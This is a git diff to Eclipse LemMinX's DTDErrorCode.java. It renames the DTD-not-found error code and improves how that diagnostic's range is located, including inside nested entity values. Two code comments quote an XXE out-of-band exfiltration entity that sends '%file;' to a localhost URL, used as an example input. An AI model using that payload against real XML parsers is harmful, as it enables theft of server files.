@@ -25,11 +25,12 @@ import org.eclipse.lemminx.dom.DOMDocument;
 import org.eclipse.lemminx.dom.DOMDocumentType;
 import org.eclipse.lemminx.dom.DOMElement;
 import org.eclipse.lemminx.dom.DOMRange;
+import org.eclipse.lemminx.dom.DTDDeclParameter;
 import org.eclipse.lemminx.dom.DTDEntityDecl;
+import org.eclipse.lemminx.extensions.contentmodel.participants.codeactions.DTDNotFoundCodeAction;
 import org.eclipse.lemminx.extensions.contentmodel.participants.codeactions.ElementDeclUnterminatedCodeAction;
 import org.eclipse.lemminx.extensions.contentmodel.participants.codeactions.EntityNotDeclaredCodeAction;
 import org.eclipse.lemminx.extensions.contentmodel.participants.codeactions.FixMissingSpaceCodeAction;
-import org.eclipse.lemminx.extensions.contentmodel.participants.codeactions.dtd_not_foundCodeAction;
 import org.eclipse.lemminx.services.extensions.ICodeActionParticipant;
 import org.eclipse.lemminx.services.extensions.diagnostics.IXMLErrorCode;
 import org.eclipse.lemminx.settings.SharedSettings;
@@ -86,7 +87,7 @@ public enum DTDErrorCode implements IXMLErrorCode {
 	QuoteRequiredInPublicID, //
 	QuoteRequiredInSystemID, //
 	SpaceRequiredAfterSYSTEM, //
-	dtd_not_found;
+	DTDNotFound;
 
 	private final String code;
 
@@ -215,7 +216,7 @@ public enum DTDErrorCode implements IXMLErrorCode {
 			return XMLPositionUtility.selectDTDDeclTagNameAt(offset, document);
 		}
 
-		case dtd_not_found: {
+		case DTDNotFound: {
 
 			// Check if DTD location is declared with xml-model/@href
 			// ex : <xml-model href="http://www.docbook.org/xml/4.4/docbookx.dtd" [
@@ -230,23 +231,37 @@ public enum DTDErrorCode implements IXMLErrorCode {
 				if (docType != null) {
 
 					// Check if DTD location is declared with <!DOCTYPE SYSTEM
-					// ex : <!DOCTYPE chapter PUBLIC "-//OASIS//DTD DocBook XML V4.4//EN"
+					// - <!DOCTYPE chapter PUBLIC "-//OASIS//DTD DocBook XML V4.4//EN"
 					// "http://www.docbook.org/xml/4.4/docbookx.dtd" [
 					String documentURI = document.getDocumentURI();
 					String dtdLocation = getResolvedLocation(documentURI, docType.getSystemIdWithoutQuotes());
 					if (hrefLocation.equals(dtdLocation)) {
-						return new Range(document.positionAt(docType.getSystemIdNode().getStart()),
-								document.positionAt(docType.getSystemIdNode().getEnd()));
+						return XMLPositionUtility.selectValueWithoutQuote(docType.getSystemIdNode());
 					}
 
 					// Check if DTD location is declared with <!ENTITY SYSTEM
-					// ex : <!ENTITY % document SYSTEM "document.ent">
+					// - <!ENTITY % document SYSTEM "document.ent">
+					// - <!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM
+					// 'http://localhost:8080/dtd.xml?%file;'>">
 					NamedNodeMap entities = docType.getEntities();
 					for (int i = 0; i < entities.getLength(); i++) {
 						DTDEntityDecl entity = (DTDEntityDecl) entities.item(i);
 						String entityLocation = getResolvedLocation(documentURI, entity.getSystemId());
 						if (hrefLocation.equals(entityLocation)) {
-							return XMLPositionUtility.createRange(entity.getSystemIdNode());
+							// <!ENTITY % document SYSTEM "document.ent">
+							return XMLPositionUtility.selectValueWithoutQuote(entity.getSystemIdNode());
+						}
+						String entityValue = entity.getValue();
+						if (entityValue != null && entityValue.startsWith("<!ENTITY")) {
+							int index = entityValue.indexOf(hrefLocation);
+							if (index != -1) {
+								// <!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM
+								// 'http://localhost:8080/dtd.xml?%file;'>">
+								DTDDeclParameter parameter = entity.getValueNode();
+								int start = parameter.getStart() + index + 1;
+								int end = start + hrefLocation.length();
+								return new Range(document.positionAt(start), document.positionAt(end));
+							}
 						}
 					}
 				}
@@ -289,7 +304,7 @@ public enum DTDErrorCode implements IXMLErrorCode {
 		codeActions.put(EntityNotDeclared.getCode(), new EntityNotDeclaredCodeAction());
 		if (sharedSettings != null
 				&& sharedSettings.getWorkspaceSettings().isResourceOperationSupported(ResourceOperationKind.Create)) {
-			codeActions.put(dtd_not_found.getCode(), new dtd_not_foundCodeAction());
+			codeActions.put(DTDNotFound.getCode(), new DTDNotFoundCodeAction());
 		}
 		ICodeActionParticipant fixMissingSpace = new FixMissingSpaceCodeAction();
 		codeActions.put(MSG_SPACE_REQUIRED_BEFORE_ELEMENT_TYPE_IN_ATTLISTDECL.getCode(), fixMissingSpace);
